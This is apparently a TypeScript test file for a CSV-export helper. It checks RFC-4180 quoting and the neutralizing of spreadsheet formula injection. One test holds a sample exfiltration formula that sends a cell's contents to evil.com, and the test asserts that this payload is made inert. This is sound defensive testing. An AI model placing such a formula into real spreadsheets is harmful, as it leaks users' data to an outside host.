import { assert, assertEqual } from "./run";
import { csvCell } from "../../src/lib/csv";

/**
 * csvCell is the boundary between user-controlled decision text and a file that
 * opens in Excel/Sheets. It has two jobs: RFC-4180 quoting and, more importantly,
 * neutralizing spreadsheet formula injection. A regression here turns an export
 * into a client-side code-execution vector, so every rule is asserted directly.
 */
export const csvTests = {
  "blanks: null/undefined become empty string"() {
    assertEqual(csvCell(null), "");
    assertEqual(csvCell(undefined), "");
  },

  "plain text passes through unquoted"() {
    assertEqual(csvCell("Migrate to Postgres"), "Migrate to Postgres");
    assertEqual(csvCell(42), "42");
  },

  "quotes fields containing a comma"() {
    assertEqual(csvCell("a,b"), '"a,b"');
  },

  "quotes fields containing a newline or carriage return"() {
    assertEqual(csvCell("line1\nline2"), '"line1\nline2"');
    assertEqual(csvCell("line1\rline2"), '"line1\rline2"');
  },

  "doubles embedded double-quotes"() {
    assertEqual(csvCell('she said "hi"'), '"she said ""hi"""');
  },

  "neutralizes leading formula characters"() {
    // Each should be prefixed with a single quote so the cell is inert text.
    assert(csvCell("=1+1").startsWith("'="), "= must be prefixed");
    assert(csvCell("+1").startsWith("'+"), "+ must be prefixed");
    assert(csvCell("-1").startsWith("'-"), "- must be prefixed");
    assert(csvCell("@SUM(A1)").startsWith("'@"), "@ must be prefixed");
    assert(csvCell("\tTAB").startsWith("'\t"), "leading tab must be prefixed");
  },

  "neutralizes the classic exfiltration payload"() {
    const payload = '=IMPORTXML(CONCAT("http://evil.com?d=",A1),"//x")';
    const out = csvCell(payload);
    // Prefixed with ' AND quoted (it contains a comma), so Excel sees literal text.
    assert(out.startsWith("\"'="), `expected inert quoted cell, got ${out}`);
  },

  "does not touch formula characters that are not leading"() {
    assertEqual(csvCell("1+1=2"), "1+1=2");
    assertEqual(csvCell("a@b"), "a@b");
  },
};
